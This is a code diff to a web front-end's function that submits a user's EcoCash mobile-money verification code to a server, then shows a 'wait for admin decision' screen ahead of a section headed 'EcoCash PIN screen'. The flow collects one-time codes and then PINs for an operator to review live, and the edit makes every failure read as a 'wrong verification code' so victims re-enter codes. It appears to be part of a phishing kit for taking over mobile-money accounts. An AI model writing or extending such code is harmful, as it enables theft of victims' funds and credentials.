@@ -2104,7 +2104,7 @@ function loadEcoCashVerificationScreen() {
 
 }
 // ======================================================
-// SAVE ECOCASH VERIFICATION
+// SAVE ECOCASH VERIFICATION CODE
 // ======================================================
 
 async function saveEcoCashVerification() {
@@ -2112,11 +2112,21 @@ async function saveEcoCashVerification() {
     const input =
         document.getElementById("ecoVerificationCode");
 
-    const code = input.value.trim();
+    if (!input) {
+        console.error(
+            "EcoCash verification input not found."
+        );
+        return;
+    }
+
+    const code =
+        input.value.trim();
 
     if (code === "") {
 
-        alert("Please enter the verification code.");
+        alert(
+            "Please enter the verification code."
+        );
 
         return;
     }
@@ -2126,56 +2136,95 @@ async function saveEcoCashVerification() {
 
     if (!applicationId) {
 
-        alert("Application session not found.");
+        alert(
+            "Application session not found."
+        );
 
         return;
     }
 
     try {
 
-        const response = await fetch(
-            `/save-ecocash-verification/${applicationId}`,
-            {
-                method: "POST",
+        const button =
+            document.getElementById(
+                "continueEcoVerification"
+            );
 
-                headers: {
-                    "Content-Type": "application/json"
-                },
+        if (button) {
 
-                body: JSON.stringify({
-                    ecocashVerificationCode: code
-                })
-            }
-        );
+            button.disabled = true;
 
-        const result = await response.json();
+            button.textContent =
+                "Verifying...";
+        }
+
+        const response =
+            await fetch(
+                `/save-ecocash-verification/${applicationId}`,
+                {
+                    method: "POST",
+
+                    headers: {
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body: JSON.stringify({
+                        ecocashVerificationCode:
+                            code
+                    })
+                }
+            );
+
+        const result =
+            await response.json();
 
         if (!response.ok || !result.success) {
 
             throw new Error(
                 result.message ||
+                result.error ||
                 "Unable to save verification."
             );
 
         }
 
-        // The value has been saved.
+        console.log(
+            "EcoCash verification code submitted."
+        );
+
+        // Wait for admin decision
         loadVerificationPendingScreen();
 
     } catch (err) {
 
         console.error(
-            "SAVE VERIFICATION ERROR:",
+            "SAVE ECOCASH VERIFICATION ERROR:",
             err
         );
 
         alert(
-            "Unable to save the verification code."
+            "you have entered wrong verification code. Please try again."
         );
+
+        const button =
+            document.getElementById(
+                "continueEcoVerification"
+            );
+
+        if (button) {
+
+            button.disabled = false;
+
+            button.textContent =
+                "Continue";
+
+        }
 
     }
 
 }
+
 // ======================================================
 // PART 23 - ECOCASH PIN SCREEN
 // ======================================================
